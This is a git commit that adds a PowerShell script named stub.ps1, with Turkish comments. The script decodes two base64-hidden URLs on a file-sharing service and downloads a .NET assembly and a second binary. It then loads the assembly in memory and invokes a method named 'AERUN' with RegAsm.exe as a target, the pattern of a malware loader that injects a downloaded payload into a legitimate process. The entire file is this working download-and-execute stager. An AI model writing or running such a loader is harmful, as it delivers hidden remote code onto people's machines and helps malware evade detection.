a17aeb1dee5256be37274ecb757f4c83c8d85c60
Emre <113838619+0bsesss@users.noreply.github.com>
2024-09-16 21:21:03 +0300

    Add files via upload

---
+++ stub.ps1
@@ -0,0 +1,38 @@
+Add-Type -AssemblyName System.Net
+
+# Ana fonksiyon
+function Main {
+    # TLS 1.2'yi kullanacak şekilde güvenlik protokolünü ayarla
+    [System.Net.ServicePointManager]::SecurityProtocol = [System.Net.SecurityProtocolType]::Tls12
+
+    # WebClient nesnesi oluştur
+    $webClient = New-Object System.Net.WebClient
+
+    # Base64 ile kodlanmış assembly metnini çöz ve indir
+    $rawAssembly = $webClient.DownloadData([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zMjYuZmlsZXRyYW5zZmVyLmlvL3N0b3JhZ2UvZG93bmxvYWQva3NLdjFSSW8xVnFa")))
+
+    # İkinci WebClient nesnesi oluştur
+    $webClient2 = New-Object System.Net.WebClient
+
+    # İkinci base64 kodlanmış dosya metnini çöz ve URL'ye dönüştür
+    $fileLink = [System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("aHR0cHM6Ly9zMjUuZmlsZXRyYW5zZmVyLmlvL3N0b3JhZ2UvZG93bmxvYWQvZzVWMkoxSUYySVRV"))
+    $address = New-Object System.Uri($fileLink)
+
+    # Dosyayı indir
+    $array6 = $webClient2.DownloadData($address)
+
+    # Çalıştırma parametrelerini oluştur
+    $parameters = @(
+        "C:\Windows\Microsoft.NET\Framework\v4.0.30319\RegAsm.exe",
+        [string]::Empty,
+        $array6,
+        $true
+    )
+
+    # Assembly yükleyerek sınıfın yöntemini çağır
+    $assembly = [System.Reflection.Assembly]::Load($rawAssembly)
+    $assembly.GetType("AE.AEdeneme").InvokeMember("AERUN", [System.Reflection.BindingFlags]::InvokeMethod, $null, $null, $parameters)
+}
+
+# Ana fonksiyonu çağır
+Main
